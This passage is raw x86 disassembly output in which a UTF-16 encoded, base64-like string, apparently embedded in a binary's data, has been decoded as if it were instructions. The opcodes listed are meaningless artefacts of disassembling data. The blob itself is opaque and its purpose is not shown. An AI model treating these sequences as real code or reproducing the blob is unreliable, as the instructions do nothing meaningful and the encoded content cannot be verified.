  40c393:	53                   	push   %ebx
  40c394:	00 74 00 35          	add    %dh,0x35(%eax,%eax,1)
  40c398:	00 68 00             	add    %ch,0x0(%eax)
  40c39b:	72 00                	jb     0x40c39d
  40c39d:	67 00 6c 00          	add    %ch,0x0(%si)
  40c3a1:	45                   	inc    %ebp
  40c3a2:	00 79 00             	add    %bh,0x0(%ecx)
  40c3a5:	74 00                	je     0x40c3a7
  40c3a7:	65 00 42 00          	add    %al,%gs:0x0(%edx)
  40c3ab:	73 00                	jae    0x40c3ad
  40c3ad:	50                   	push   %eax
  40c3ae:	00 52 00             	add    %dl,0x0(%edx)
  40c3b1:	70 00                	jo     0x40c3b3
  40c3b3:	6f                   	outsl  %ds:(%esi),(%dx)
  40c3b4:	00 68 00             	add    %ch,0x0(%eax)
  40c3b7:	5a                   	pop    %edx
  40c3b8:	00 53 00             	add    %dl,0x0(%ebx)
  40c3bb:	36 00 72 00          	add    %dh,%ss:0x0(%edx)
  40c3bf:	66 00 56 00          	data16 add %dl,0x0(%esi)
  40c3c3:	79 00                	jns    0x40c3c5
  40c3c5:	76 00                	jbe    0x40c3c7
  40c3c7:	4c                   	dec    %esp
  40c3c8:	00 47 00             	add    %al,0x0(%edi)
  40c3cb:	38 00                	cmp    %al,(%eax)
  40c3cd:	73 00                	jae    0x40c3cf
  40c3cf:	64 00 33             	add    %dh,%fs:(%ebx)
  40c3d2:	00 79 00             	add    %bh,0x0(%ecx)
  40c3d5:	69 00 56 00 55 00    	imul   $0x550056,(%eax),%eax
  40c3db:	67 00 38             	add    %bh,(%bx,%si)
  40c3de:	00 71 00             	add    %dh,0x0(%ecx)
  40c3e1:	44                   	inc    %esp
  40c3e2:	00 68 00             	add    %ch,0x0(%eax)
  40c3e5:	48                   	dec    %eax
  40c3e6:	00 56 00             	add    %dl,0x0(%esi)
  40c3e9:	47                   	inc    %edi
  40c3ea:	00 76 00             	add    %dh,0x0(%esi)
  40c3ed:	61                   	popa
  40c3ee:	00 55 00             	add    %dl,0x0(%ebp)
  40c3f1:	35 00 78 00 7a       	xor    $0x7a007800,%eax
  40c3f6:	00 55 00             	add    %dl,0x0(%ebp)
  40c3f9:	50                   	push   %eax
  40c3fa:	00 53 00             	add    %dl,0x0(%ebx)
  40c3fd:	6e                   	outsb  %ds:(%esi),(%dx)
  40c3fe:	00 47 00             	add    %al,0x0(%edi)
  40c401:	75 00                	jne    0x40c403
  40c403:	30 00                	xor    %al,(%eax)
  40c405:	48                   	dec    %eax
  40c406:	00 4d 00             	add    %cl,0x0(%ebp)
  40c409:	73 00                	jae    0x40c40b
  40c40b:	77 00                	ja     0x40c40d
  40c40d:	6f                   	outsl  %ds:(%esi),(%dx)
  40c40e:	00 6f 00             	add    %ch,0x0(%edi)
  40c411:	53                   	push   %ebx
  40c412:	00 6d 00             	add    %ch,0x0(%ebp)
  40c415:	73 00                	jae    0x40c417
  40c417:	43                   	inc    %ebx
  40c418:	00 6d 00             	add    %ch,0x0(%ebp)
  40c41b:	4f                   	dec    %edi
  40c41c:	00 4e 00             	add    %cl,0x0(%esi)
  40c41f:	2b 00                	sub    (%eax),%eax
  40c421:	70 00                	jo     0x40c423
  40c423:	47                   	inc    %edi
  40c424:	00 70 00             	add    %dh,0x0(%eax)
  40c427:	47                   	inc    %edi
  40c428:	00 6d 00             	add    %ch,0x0(%ebp)
  40c42b:	69 00 61 00 74 00    	imul   $0x740061,(%eax),%eax
  40c431:	31 00                	xor    %eax,(%eax)
  40c433:	6d                   	insl   (%dx),%es:(%edi)
  40c434:	00 45 00             	add    %al,0x0(%ebp)
  40c437:	2f                   	das
  40c438:	00 54 00 5a          	add    %dl,0x5a(%eax,%eax,1)
  40c43c:	00 69 00             	add    %ch,0x0(%ecx)
  40c43f:	6e                   	outsb  %ds:(%esi),(%dx)
  40c440:	00 79 00             	add    %bh,0x0(%ecx)
  40c443:	66 00 36             	data16 add %dh,(%esi)
  40c446:	00 46 00             	add    %al,0x0(%esi)
  40c449:	68 00 57 00 4c       	push   $0x4c005700
  40c44e:	00 6f 00             	add    %ch,0x0(%edi)
  40c451:	56                   	push   %esi
  40c452:	00 41 00             	add    %al,0x0(%ecx)
  40c455:	35 00 41 00 31       	xor    $0x31004100,%eax
  40c45a:	00 71 00             	add    %dh,0x0(%ecx)
  40c45d:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
  40c461:	5a                   	pop    %edx
  40c462:	00 31                	add    %dh,(%ecx)
  40c464:	00 4f 00             	add    %cl,0x0(%edi)
  40c467:	39 00                	cmp    %eax,(%eax)
  40c469:	70 00                	jo     0x40c46b
  40c46b:	70 00                	jo     0x40c46d
  40c46d:	32 00                	xor    (%eax),%al
  40c46f:	5a                   	pop    %edx
  40c470:	00 66 00             	add    %ah,0x0(%esi)
  40c473:	59                   	pop    %ecx
  40c474:	00 62 00             	add    %ah,0x0(%edx)
  40c477:	4e                   	dec    %esi
  40c478:	00 52 00             	add    %dl,0x0(%edx)
  40c47b:	41                   	inc    %ecx
  40c47c:	00 77 00             	add    %dh,0x0(%edi)
  40c47f:	6d                   	insl   (%dx),%es:(%edi)
  40c480:	00 6a 00             	add    %ch,0x0(%edx)
  40c483:	37                   	aaa
  40c484:	00 50 00             	add    %dl,0x0(%eax)
  40c487:	2b 00                	sub    (%eax),%eax
  40c489:	77 00                	ja     0x40c48b
  40c48b:	77 00                	ja     0x40c48d
  40c48d:	77 00                	ja     0x40c48f
  40c48f:	58                   	pop    %eax
  40c490:	00 4c 00 71          	add    %cl,0x71(%eax,%eax,1)
  40c494:	00 49 00             	add    %cl,0x0(%ecx)
  40c497:	42                   	inc    %edx
  40c498:	00 37                	add    %dh,(%edi)
  40c49a:	00 34 00             	add    %dh,(%eax,%eax,1)
  40c49d:	59                   	pop    %ecx
  40c49e:	00 35 00 32 00 6d    	add    %dh,0x6d003200
  40c4a4:	00 61 00             	add    %ah,0x0(%ecx)
  40c4a7:	57                   	push   %edi
  40c4a8:	00 76 00             	add    %dh,0x0(%esi)
  40c4ab:	50                   	push   %eax
  40c4ac:	00 30                	add    %dh,(%eax)
  40c4ae:	00 4e 00             	add    %cl,0x0(%esi)
  40c4b1:	32 00                	xor    (%eax),%al
  40c4b3:	6c                   	insb   (%dx),%es:(%edi)
  40c4b4:	00 6a 00             	add    %ch,0x0(%edx)
  40c4b7:	74 00                	je     0x40c4b9
  40c4b9:	74 00                	je     0x40c4bb
  40c4bb:	41                   	inc    %ecx
  40c4bc:	00 73 00             	add    %dh,0x0(%ebx)
  40c4bf:	61                   	popa
  40c4c0:	00 42 00             	add    %al,0x0(%edx)
  40c4c3:	46                   	inc    %esi
  40c4c4:	00 7a 00             	add    %bh,0x0(%edx)
  40c4c7:	64 00 2b             	add    %ch,%fs:(%ebx)
  40c4ca:	00 72 00             	add    %dh,0x0(%edx)
  40c4cd:	35 00 54 00 50       	xor    $0x50005400,%eax
  40c4d2:	00 50 00             	add    %dl,0x0(%eax)
  40c4d5:	47                   	inc    %edi
  40c4d6:	00 42 00             	add    %al,0x0(%edx)
  40c4d9:	5a                   	pop    %edx
  40c4da:	00 48 00             	add    %cl,0x0(%eax)
  40c4dd:	73 00                	jae    0x40c4df
  40c4df:	2b 00                	sub    (%eax),%eax
  40c4e1:	4e                   	dec    %esi
  40c4e2:	00 4a 00             	add    %cl,0x0(%edx)
  40c4e5:	4d                   	dec    %ebp
  40c4e6:	00 32                	add    %dh,(%edx)
  40c4e8:	00 75 00             	add    %dh,0x0(%ebp)
  40c4eb:	68 00 75 00 76       	push   $0x76007500
  40c4f0:	00 35 00 33 00 37    	add    %dh,0x37003300
  40c4f6:	00 2f                	add    %ch,(%edi)
  40c4f8:	00 4c 00 58          	add    %cl,0x58(%eax,%eax,1)
  40c4fc:	00 78 00             	add    %bh,0x0(%eax)
  40c4ff:	44                   	inc    %esp
  40c500:	00 79 00             	add    %bh,0x0(%ecx)
  40c503:	6f                   	outsl  %ds:(%esi),(%dx)
  40c504:	00 6b 00             	add    %ch,0x0(%ebx)
  40c507:	63 00                	arpl   %eax,(%eax)
  40c509:	50                   	push   %eax
  40c50a:	00 51 00             	add    %dl,0x0(%ecx)
  40c50d:	76 00                	jbe    0x40c50f
  40c50f:	55                   	push   %ebp
  40c510:	00 50 00             	add    %dl,0x0(%eax)
  40c513:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40c517:	75 00                	jne    0x40c519
  40c519:	63 00                	arpl   %eax,(%eax)
  40c51b:	32 00                	xor    (%eax),%al
  40c51d:	4c                   	dec    %esp
  40c51e:	00 78 00             	add    %bh,0x0(%eax)
  40c521:	55                   	push   %ebp
  40c522:	00 6f 00             	add    %ch,0x0(%edi)
  40c525:	76 00                	jbe    0x40c527
  40c527:	4e                   	dec    %esi
  40c528:	00 75 00             	add    %dh,0x0(%ebp)
  40c52b:	58                   	pop    %eax
  40c52c:	00 52 00             	add    %dl,0x0(%edx)
  40c52f:	46                   	inc    %esi
  40c530:	00 55 00             	add    %dl,0x0(%ebp)
  40c533:	31 00                	xor    %eax,(%eax)
  40c535:	4f                   	dec    %edi
  40c536:	00 6f 00             	add    %ch,0x0(%edi)
  40c539:	4c                   	dec    %esp
  40c53a:	00 50 00             	add    %dl,0x0(%eax)
  40c53d:	46                   	inc    %esi
  40c53e:	00 4b 00             	add    %cl,0x0(%ebx)
  40c541:	79 00                	jns    0x40c543
  40c543:	4f                   	dec    %edi
  40c544:	00 33                	add    %dh,(%ebx)
  40c546:	00 52 00             	add    %dl,0x0(%edx)
  40c549:	71 00                	jno    0x40c54b
  40c54b:	56                   	push   %esi
  40c54c:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40c550:	00 4d 00             	add    %cl,0x0(%ebp)
  40c553:	4c                   	dec    %esp
  40c554:	00 4d 00             	add    %cl,0x0(%ebp)
  40c557:	75 00                	jne    0x40c559
  40c559:	41                   	inc    %ecx
  40c55a:	00 6d 00             	add    %ch,0x0(%ebp)
  40c55d:	41                   	inc    %ecx
  40c55e:	00 2f                	add    %ch,(%edi)
  40c560:	00 4a 00             	add    %cl,0x0(%edx)
  40c563:	4f                   	dec    %edi
  40c564:	00 73 00             	add    %dh,0x0(%ebx)
  40c567:	43                   	inc    %ebx
  40c568:	00 59 00             	add    %bl,0x0(%ecx)
  40c56b:	46                   	inc    %esi
  40c56c:	00 7a 00             	add    %bh,0x0(%edx)
  40c56f:	6b 00 36             	imul   $0x36,(%eax),%eax
  40c572:	00 4c 00 6d          	add    %cl,0x6d(%eax,%eax,1)
  40c576:	00 4e 00             	add    %cl,0x0(%esi)
  40c579:	59                   	pop    %ecx
  40c57a:	00 63 00             	add    %ah,0x0(%ebx)
  40c57d:	4f                   	dec    %edi
  40c57e:	00 31                	add    %dh,(%ecx)
  40c580:	00 65 00             	add    %ah,0x0(%ebp)
  40c583:	45                   	inc    %ebp
  40c584:	00 36                	add    %dh,(%esi)
  40c586:	00 63 00             	add    %ah,0x0(%ebx)
  40c589:	77 00                	ja     0x40c58b
  40c58b:	2f                   	das
  40c58c:	00 72 00             	add    %dh,0x0(%edx)
  40c58f:	54                   	push   %esp
  40c590:	00 31                	add    %dh,(%ecx)
  40c592:	00 42 00             	add    %al,0x0(%edx)
  40c595:	70 00                	jo     0x40c597
  40c597:	78 00                	js     0x40c599
  40c599:	4f                   	dec    %edi
  40c59a:	00 42 00             	add    %al,0x0(%edx)
  40c59d:	50                   	push   %eax
  40c59e:	00 63 00             	add    %ah,0x0(%ebx)
  40c5a1:	5a                   	pop    %edx
  40c5a2:	00 49 00             	add    %cl,0x0(%ecx)
  40c5a5:	49                   	dec    %ecx
  40c5a6:	00 64 00 42          	add    %ah,0x42(%eax,%eax,1)
  40c5aa:	00 6b 00             	add    %ch,0x0(%ebx)
  40c5ad:	68 00 52 00 41       	push   $0x41005200
  40c5b2:	00 49 00             	add    %cl,0x0(%ecx)
  40c5b5:	47                   	inc    %edi
  40c5b6:	00 45 00             	add    %al,0x0(%ebp)
  40c5b9:	39 00                	cmp    %eax,(%eax)
  40c5bb:	35 00 31 00 32       	xor    $0x32003100,%eax
  40c5c0:	00 51 00             	add    %dl,0x0(%ecx)
  40c5c3:	58                   	pop    %eax
  40c5c4:	00 59 00             	add    %bl,0x0(%ecx)
  40c5c7:	52                   	push   %edx
  40c5c8:	00 74 00 44          	add    %dh,0x44(%eax,%eax,1)
  40c5cc:	00 79 00             	add    %bh,0x0(%ecx)
  40c5cf:	49                   	dec    %ecx
  40c5d0:	00 30                	add    %dh,(%eax)
  40c5d2:	00 58 00             	add    %bl,0x0(%eax)
  40c5d5:	39 00                	cmp    %eax,(%eax)
  40c5d7:	44                   	inc    %esp
  40c5d8:	00 6e 00             	add    %ch,0x0(%esi)
  40c5db:	61                   	popa
  40c5dc:	00 48 00             	add    %cl,0x0(%eax)
  40c5df:	4c                   	dec    %esp
  40c5e0:	00 45 00             	add    %al,0x0(%ebp)
  40c5e3:	64 00 4b 00          	add    %cl,%fs:0x0(%ebx)
  40c5e7:	51                   	push   %ecx
  40c5e8:	00 30                	add    %dh,(%eax)
  40c5ea:	00 37                	add    %dh,(%edi)
  40c5ec:	00 62 00             	add    %ah,0x0(%edx)
  40c5ef:	4c                   	dec    %esp
  40c5f0:	00 4c 00 78          	add    %cl,0x78(%eax,%eax,1)
  40c5f4:	00 71 00             	add    %dh,0x0(%ecx)
  40c5f7:	72 00                	jb     0x40c5f9
  40c5f9:	71 00                	jno    0x40c5fb
  40c5fb:	59                   	pop    %ecx
  40c5fc:	00 76 00             	add    %dh,0x0(%esi)
  40c5ff:	64 00 64 00 68       	add    %ah,%fs:0x68(%eax,%eax,1)
  40c604:	00 72 00             	add    %dh,0x0(%edx)
  40c607:	58                   	pop    %eax
  40c608:	00 7a 00             	add    %bh,0x0(%edx)
  40c60b:	32 00                	xor    (%eax),%al
  40c60d:	71 00                	jno    0x40c60f
  40c60f:	4c                   	dec    %esp
  40c610:	00 77 00             	add    %dh,0x0(%edi)
  40c613:	45                   	inc    %ebp
  40c614:	00 4b 00             	add    %cl,0x0(%ebx)
  40c617:	55                   	push   %ebp
  40c618:	00 36                	add    %dh,(%esi)
  40c61a:	00 34 00             	add    %dh,(%eax,%eax,1)
  40c61d:	48                   	dec    %eax
  40c61e:	00 72 00             	add    %dh,0x0(%edx)
  40c621:	6b 00 73             	imul   $0x73,(%eax),%eax
  40c624:	00 66 00             	add    %ah,0x0(%esi)
  40c627:	67 00 44 00          	add    %al,0x0(%si)
  40c62b:	42                   	inc    %edx
  40c62c:	00 52 00             	add    %dl,0x0(%edx)
  40c62f:	72 00                	jb     0x40c631
  40c631:	6b 00 69             	imul   $0x69,(%eax),%eax
  40c634:	00 55 00             	add    %dl,0x0(%ebp)
  40c637:	57                   	push   %edi
  40c638:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40c63c:	00 74 00 50          	add    %dh,0x50(%eax,%eax,1)
  40c640:	00 6e 00             	add    %ch,0x0(%esi)
  40c643:	55                   	push   %ebp
  40c644:	00 68 00             	add    %ch,0x0(%eax)
  40c647:	37                   	aaa
  40c648:	00 39                	add    %bh,(%ecx)
  40c64a:	00 68 00             	add    %ch,0x0(%eax)
  40c64d:	51                   	push   %ecx
  40c64e:	00 65 00             	add    %ah,0x0(%ebp)
  40c651:	77 00                	ja     0x40c653
  40c653:	73 00                	jae    0x40c655
  40c655:	6f                   	outsl  %ds:(%esi),(%dx)
  40c656:	00 56 00             	add    %dl,0x0(%esi)
  40c659:	44                   	inc    %esp
  40c65a:	00 4e 00             	add    %cl,0x0(%esi)
  40c65d:	6f                   	outsl  %ds:(%esi),(%dx)
  40c65e:	00 2b                	add    %ch,(%ebx)
  40c660:	00 6d 00             	add    %ch,0x0(%ebp)
  40c663:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
  40c667:	71 00                	jno    0x40c669
  40c669:	48                   	dec    %eax
  40c66a:	00 71 00             	add    %dh,0x0(%ecx)
  40c66d:	78 00                	js     0x40c66f
  40c66f:	77 00                	ja     0x40c671
  40c671:	44                   	inc    %esp
  40c672:	00 57 00             	add    %dl,0x0(%edi)
  40c675:	48                   	dec    %eax
  40c676:	00 34 00             	add    %dh,(%eax,%eax,1)
  40c679:	38 00                	cmp    %al,(%eax)
  40c67b:	74 00                	je     0x40c67d
  40c67d:	4d                   	dec    %ebp
  40c67e:	00 52 00             	add    %dl,0x0(%edx)
  40c681:	6b 00 49             	imul   $0x49,(%eax),%eax
  40c684:	00 42 00             	add    %al,0x0(%edx)
  40c687:	6e                   	outsb  %ds:(%esi),(%dx)
  40c688:	00 30                	add    %dh,(%eax)
  40c68a:	00 4e 00             	add    %cl,0x0(%esi)
  40c68d:	78 00                	js     0x40c68f
  40c68f:	64 00 30             	add    %dh,%fs:(%eax)
  40c692:	00 59 00             	add    %bl,0x0(%ecx)
  40c695:	63 00                	arpl   %eax,(%eax)
  40c697:	74 00                	je     0x40c699
  40c699:	64 00 2f             	add    %ch,%fs:(%edi)
  40c69c:	00 2f                	add    %ch,(%edi)
  40c69e:	00 6e 00             	add    %ch,0x0(%esi)
  40c6a1:	56                   	push   %esi
  40c6a2:	00 53 00             	add    %dl,0x0(%ebx)
  40c6a5:	68 00 4b 00 72       	push   $0x72004b00
  40c6aa:	00 67 00             	add    %ah,0x0(%edi)
  40c6ad:	79 00                	jns    0x40c6af
  40c6af:	30 00                	xor    %al,(%eax)
  40c6b1:	55                   	push   %ebp
  40c6b2:	00 68 00             	add    %ch,0x0(%eax)
  40c6b5:	72 00                	jb     0x40c6b7
  40c6b7:	66 00 49 00          	data16 add %cl,0x0(%ecx)
  40c6bb:	50                   	push   %eax
  40c6bc:	00 56 00             	add    %dl,0x0(%esi)
  40c6bf:	33 00                	xor    (%eax),%eax
  40c6c1:	47                   	inc    %edi
  40c6c2:	00 4b 00             	add    %cl,0x0(%ebx)
  40c6c5:	61                   	popa
  40c6c6:	00 6c 00 31          	add    %ch,0x31(%eax,%eax,1)
  40c6ca:	00 42 00             	add    %al,0x0(%edx)
  40c6cd:	71 00                	jno    0x40c6cf
  40c6cf:	75 00                	jne    0x40c6d1
  40c6d1:	36 00 36             	add    %dh,%ss:(%esi)
  40c6d4:	00 75 00             	add    %dh,0x0(%ebp)
  40c6d7:	73 00                	jae    0x40c6d9
  40c6d9:	75 00                	jne    0x40c6db
  40c6db:	76 00                	jbe    0x40c6dd
  40c6dd:	43                   	inc    %ebx
  40c6de:	00 63 00             	add    %ah,0x0(%ebx)
  40c6e1:	5a                   	pop    %edx
  40c6e2:	00 4d 00             	add    %cl,0x0(%ebp)
  40c6e5:	39 00                	cmp    %eax,(%eax)
  40c6e7:	74 00                	je     0x40c6e9
  40c6e9:	6c                   	insb   (%dx),%es:(%edi)
  40c6ea:	00 4b 00             	add    %cl,0x0(%ebx)
  40c6ed:	32 00                	xor    (%eax),%al
  40c6ef:	62 00                	bound  %eax,(%eax)
  40c6f1:	4b                   	dec    %ebx
  40c6f2:	00 67 00             	add    %ah,0x0(%edi)
  40c6f5:	45                   	inc    %ebp
  40c6f6:	00 6b 00             	add    %ch,0x0(%ebx)
  40c6f9:	31 00                	xor    %eax,(%eax)
  40c6fb:	66 00 6b 00          	data16 add %ch,0x0(%ebx)
  40c6ff:	67 00 2b             	add    %ch,(%bp,%di)
  40c702:	00 6b 00             	add    %ch,0x0(%ebx)
  40c705:	43                   	inc    %ebx
  40c706:	00 4f 00             	add    %cl,0x0(%edi)
  40c709:	5a                   	pop    %edx
  40c70a:	00 47 00             	add    %al,0x0(%edi)
  40c70d:	4b                   	dec    %ebx
  40c70e:	00 31                	add    %dh,(%ecx)
  40c710:	00 71 00             	add    %dh,0x0(%ecx)
  40c713:	43                   	inc    %ebx
  40c714:	00 41 00             	add    %al,0x0(%ecx)
  40c717:	66 00 78 00          	data16 add %bh,0x0(%eax)
  40c71b:	49                   	dec    %ecx
  40c71c:	00 6d 00             	add    %ch,0x0(%ebp)
  40c71f:	6a 00                	push   $0x0
  40c721:	31 00                	xor    %eax,(%eax)
  40c723:	57                   	push   %edi
  40c724:	00 4a 00             	add    %cl,0x0(%edx)
  40c727:	63 00                	arpl   %eax,(%eax)
  40c729:	4f                   	dec    %edi
  40c72a:	00 48 00             	add    %cl,0x0(%eax)
  40c72d:	32 00                	xor    (%eax),%al
  40c72f:	4b                   	dec    %ebx
  40c730:	00 39                	add    %bh,(%ecx)
  40c732:	00 4e 00             	add    %cl,0x0(%esi)
  40c735:	35 00 47 00 6d       	xor    $0x6d004700,%eax
  40c73a:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40c73e:	00 4a 00             	add    %cl,0x0(%edx)
  40c741:	67 00 63 00          	add    %ah,0x0(%bp,%di)
  40c745:	38 00                	cmp    %al,(%eax)
  40c747:	44                   	inc    %esp
  40c748:	00 50 00             	add    %dl,0x0(%eax)
  40c74b:	69 00 37 00 55 00    	imul   $0x550037,(%eax),%eax
  40c751:	57                   	push   %edi
  40c752:	00 49 00             	add    %cl,0x0(%ecx)
  40c755:	44                   	inc    %esp
  40c756:	00 62 00             	add    %ah,0x0(%edx)
  40c759:	64 00 30             	add    %dh,%fs:(%eax)
  40c75c:	00 6c 00 78          	add    %ch,0x78(%eax,%eax,1)
  40c760:	00 79 00             	add    %bh,0x0(%ecx)
  40c763:	6b 00 75             	imul   $0x75,(%eax),%eax
  40c766:	00 4b 00             	add    %cl,0x0(%ebx)
  40c769:	61                   	popa
  40c76a:	00 51 00             	add    %dl,0x0(%ecx)
  40c76d:	4f                   	dec    %edi
  40c76e:	00 54 00 50          	add    %dl,0x50(%eax,%eax,1)
  40c772:	00 50 00             	add    %dl,0x0(%eax)
  40c775:	70 00                	jo     0x40c777
  40c777:	4d                   	dec    %ebp
  40c778:	00 65 00             	add    %ah,0x0(%ebp)
  40c77b:	74 00                	je     0x40c77d
  40c77d:	4d                   	dec    %ebp
  40c77e:	00 4b 00             	add    %cl,0x0(%ebx)
  40c781:	73 00                	jae    0x40c783
  40c783:	6a 00                	push   $0x0
  40c785:	6f                   	outsl  %ds:(%esi),(%dx)
  40c786:	00 70 00             	add    %dh,0x0(%eax)
  40c789:	67 00 59 00          	add    %bl,0x0(%bx,%di)
  40c78d:	6f                   	outsl  %ds:(%esi),(%dx)
  40c78e:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
  40c792:	00 41 00             	add    %al,0x0(%ecx)
  40c795:	61                   	popa
  40c796:	00 39                	add    %bh,(%ecx)
  40c798:	00 4e 00             	add    %cl,0x0(%esi)
  40c79b:	33 00                	xor    (%eax),%eax
  40c79d:	78 00                	js     0x40c79f
  40c79f:	33 00                	xor    (%eax),%eax
  40c7a1:	63 00                	arpl   %eax,(%eax)
  40c7a3:	32 00                	xor    (%eax),%al
  40c7a5:	52                   	push   %edx
  40c7a6:	00 41 00             	add    %al,0x0(%ecx)
  40c7a9:	31 00                	xor    %eax,(%eax)
  40c7ab:	75 00                	jne    0x40c7ad
  40c7ad:	4a                   	dec    %edx
  40c7ae:	00 78 00             	add    %bh,0x0(%eax)
  40c7b1:	37                   	aaa
  40c7b2:	00 6f 00             	add    %ch,0x0(%edi)
  40c7b5:	72 00                	jb     0x40c7b7
  40c7b7:	4f                   	dec    %edi
  40c7b8:	00 45 00             	add    %al,0x0(%ebp)
  40c7bb:	50                   	push   %eax
  40c7bc:	00 46 00             	add    %al,0x0(%esi)
  40c7bf:	6e                   	outsb  %ds:(%esi),(%dx)
  40c7c0:	00 62 00             	add    %ah,0x0(%edx)
  40c7c3:	70 00                	jo     0x40c7c5
  40c7c5:	2b 00                	sub    (%eax),%eax
  40c7c7:	67 00 65 00          	add    %ah,0x0(%di)
  40c7cb:	38 00                	cmp    %al,(%eax)
  40c7cd:	51                   	push   %ecx
  40c7ce:	00 36                	add    %dh,(%esi)
  40c7d0:	00 4d 00             	add    %cl,0x0(%ebp)
  40c7d3:	46                   	inc    %esi
  40c7d4:	00 7a 00             	add    %bh,0x0(%edx)
  40c7d7:	64 00 6b 00          	add    %ch,%fs:0x0(%ebx)
  40c7db:	33 00                	xor    (%eax),%eax
  40c7dd:	61                   	popa
  40c7de:	00 69 00             	add    %ch,0x0(%ecx)
  40c7e1:	49                   	dec    %ecx
  40c7e2:	00 4e 00             	add    %cl,0x0(%esi)
  40c7e5:	30 00                	xor    %al,(%eax)
  40c7e7:	61                   	popa
  40c7e8:	00 47 00             	add    %al,0x0(%edi)
  40c7eb:	50                   	push   %eax
  40c7ec:	00 30                	add    %dh,(%eax)
  40c7ee:	00 65 00             	add    %ah,0x0(%ebp)
  40c7f1:	73 00                	jae    0x40c7f3
  40c7f3:	36 00 6b 00          	add    %ch,%ss:0x0(%ebx)
  40c7f7:	2f                   	das
  40c7f8:	00 75 00             	add    %dh,0x0(%ebp)
  40c7fb:	63 00                	arpl   %eax,(%eax)
  40c7fd:	2b 00                	sub    (%eax),%eax
  40c7ff:	67 00 6a 00          	add    %ch,0x0(%bp,%si)
  40c803:	69 00 58 00 4b 00    	imul   $0x4b0058,(%eax),%eax
  40c809:	2f                   	das
  40c80a:	00 74 00 6a          	add    %dh,0x6a(%eax,%eax,1)
  40c80e:	00 6b 00             	add    %ch,0x0(%ebx)
  40c811:	6c                   	insb   (%dx),%es:(%edi)
  40c812:	00 44 00 30          	add    %al,0x30(%eax,%eax,1)
  40c816:	00 73 00             	add    %dh,0x0(%ebx)
  40c819:	36 00 38             	add    %bh,%ss:(%eax)
  40c81c:	00 43 00             	add    %al,0x0(%ebx)
  40c81f:	52                   	push   %edx
  40c820:	00 6c 00 63          	add    %ch,0x63(%eax,%eax,1)
  40c824:	00 35 00 38 00 39    	add    %dh,0x39003800
  40c82a:	00 69 00             	add    %ch,0x0(%ecx)
  40c82d:	43                   	inc    %ebx
  40c82e:	00 66 00             	add    %ah,0x0(%esi)
  40c831:	30 00                	xor    %al,(%eax)
  40c833:	47                   	inc    %edi
  40c834:	00 79 00             	add    %bh,0x0(%ecx)
  40c837:	77 00                	ja     0x40c839
  40c839:	73 00                	jae    0x40c83b
  40c83b:	4f                   	dec    %edi
  40c83c:	00 6e 00             	add    %ch,0x0(%esi)
  40c83f:	44                   	inc    %esp
  40c840:	00 53 00             	add    %dl,0x0(%ebx)
  40c843:	54                   	push   %esp
  40c844:	00 41 00             	add    %al,0x0(%ecx)
  40c847:	6d                   	insl   (%dx),%es:(%edi)
  40c848:	00 42 00             	add    %al,0x0(%edx)
  40c84b:	30 00                	xor    %al,(%eax)
  40c84d:	6b 00 56             	imul   $0x56,(%eax),%eax
  40c850:	00 71 00             	add    %dh,0x0(%ecx)
  40c853:	4e                   	dec    %esi
  40c854:	00 78 00             	add    %bh,0x0(%eax)
  40c857:	32 00                	xor    (%eax),%al
  40c859:	39 00                	cmp    %eax,(%eax)
  40c85b:	69 00 42 00 35 00    	imul   $0x350042,(%eax),%eax
  40c861:	52                   	push   %edx
  40c862:	00 51 00             	add    %dl,0x0(%ecx)
  40c865:	42                   	inc    %edx
  40c866:	00 55 00             	add    %dl,0x0(%ebp)
  40c869:	7a 00                	jp     0x40c86b
  40c86b:	79 00                	jns    0x40c86d
  40c86d:	71 00                	jno    0x40c86f
  40c86f:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c873:	37                   	aaa
  40c874:	00 4e 00             	add    %cl,0x0(%esi)
  40c877:	4e                   	dec    %esi
  40c878:	00 73 00             	add    %dh,0x0(%ebx)
  40c87b:	6e                   	outsb  %ds:(%esi),(%dx)
  40c87c:	00 75 00             	add    %dh,0x0(%ebp)
  40c87f:	36 00 65 00          	add    %ah,%ss:0x0(%ebp)
  40c883:	6a 00                	push   $0x0
  40c885:	53                   	push   %ebx
  40c886:	00 71 00             	add    %dh,0x0(%ecx)
  40c889:	67 00 41 00          	add    %al,0x0(%bx,%di)
  40c88d:	35 00 42 00 37       	xor    $0x37004200,%eax
  40c892:	00 33                	add    %dh,(%ebx)
  40c894:	00 4d 00             	add    %cl,0x0(%ebp)
  40c897:	6a 00                	push   $0x0
  40c899:	56                   	push   %esi
  40c89a:	00 59 00             	add    %bl,0x0(%ecx)
  40c89d:	34 00                	xor    $0x0,%al
  40c89f:	48                   	dec    %eax
  40c8a0:	00 32                	add    %dh,(%edx)
  40c8a2:	00 4d 00             	add    %cl,0x0(%ebp)
  40c8a5:	70 00                	jo     0x40c8a7
  40c8a7:	69 00 55 00 65 00    	imul   $0x650055,(%eax),%eax
  40c8ad:	65 00 64 00 49       	add    %ah,%gs:0x49(%eax,%eax,1)
  40c8b2:	00 6f 00             	add    %ch,0x0(%edi)
  40c8b5:	6b 00 76             	imul   $0x76,(%eax),%eax
  40c8b8:	00 44 00 78          	add    %al,0x78(%eax,%eax,1)
  40c8bc:	00 30                	add    %dh,(%eax)
  40c8be:	00 4a 00             	add    %cl,0x0(%edx)
  40c8c1:	64 00 6c 00 73       	add    %ch,%fs:0x73(%eax,%eax,1)
  40c8c6:	00 6d 00             	add    %ch,0x0(%ebp)
  40c8c9:	31 00                	xor    %eax,(%eax)
  40c8cb:	75 00                	jne    0x40c8cd
  40c8cd:	57                   	push   %edi
  40c8ce:	00 38                	add    %bh,(%eax)
  40c8d0:	00 38                	add    %bh,(%eax)
  40c8d2:	00 39                	add    %bh,(%ecx)
  40c8d4:	00 38                	add    %bh,(%eax)
  40c8d6:	00 61 00             	add    %ah,0x0(%ecx)
  40c8d9:	6d                   	insl   (%dx),%es:(%edi)
  40c8da:	00 69 00             	add    %ch,0x0(%ecx)
  40c8dd:	47                   	inc    %edi
  40c8de:	00 4f 00             	add    %cl,0x0(%edi)
  40c8e1:	46                   	inc    %esi
  40c8e2:	00 45 00             	add    %al,0x0(%ebp)
